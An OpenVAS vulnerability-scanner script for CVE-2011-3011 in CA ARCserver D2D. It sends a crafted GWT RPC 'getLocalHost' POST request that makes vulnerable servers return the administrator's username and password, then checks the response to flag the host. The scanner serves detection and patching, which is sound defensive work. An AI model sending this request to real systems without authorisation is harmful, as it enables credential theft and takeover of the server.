###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ca_arcserver_d2d_mult_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# CA ARCserver D2D GWT RPC Request Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to gain the sensitive
  information, further attacker can login to the affected application
  then execute arbitrary commands with Administrator group privileges.
  Impact Level: Application";
tag_affected = "CA ARCserver D2D Version r15.0";
tag_insight = "Multiple flaws are due to error in GWT RPC mechanism when receives
  messages from the Administrator browser. A remote user with access to the
  web server can send a POST request to the homepageServlet serlvet containing
  the 'getLocalHost' message and the correct filename of a certain descriptor
  to disclose the username and password of the target application.";
tag_solution = "No solution or patch is available as of 18th August, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://arcserve.com/us/default.aspx";
tag_summary = "The host is running CA ARCserver D2D and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(902462);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-29 17:55:33 +0200 (Fri, 29 Jul 2011)");
  script_cve_id("CVE-2011-3011");
  script_bugtraq_id(48897);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("CA ARCserver D2D GWT RPC Request Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for Security Bypass vulnerability in CA ARCserver D2D");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8014);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103426/caarcserve-exec.txt");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check fot the default port
port = 8014;
if(!get_port_state(port)){
  exit(0);
}

## Get the response from the server
req = http_get (item:"/" , port:port);
res = http_keepalive_send_recv(port:port,data:req);

## Confirm the server
if(">CA ARCserve D2D" >< res)
{
  ## Construct the POST data
  postdata = string('5|0|4|http://',get_host_name(),':',port,'/contents/|2C6B' +
                    '33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client' +
                    '.homepage.HomepageService|getLocalHost|1|2|3|4|0|');

  ## Construct the POST request
  req = string("POST /contents/service/homepage HTTP/1.1\r\n",
               "Host: ",get_host_name(), ":", port, "\r\n",
               "Content-Type: text/x-gwt-rpc; charset=utf-8\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);

  res = http_send_recv(port:port, data:req);

  ## Confirm the exploit
  if('//OK' >< res && '"user"' >< res && '"password"' >< res &&
     '"hostName"' >< res &&  '"uuid"' >< res){
    security_warning(port);
  }
}
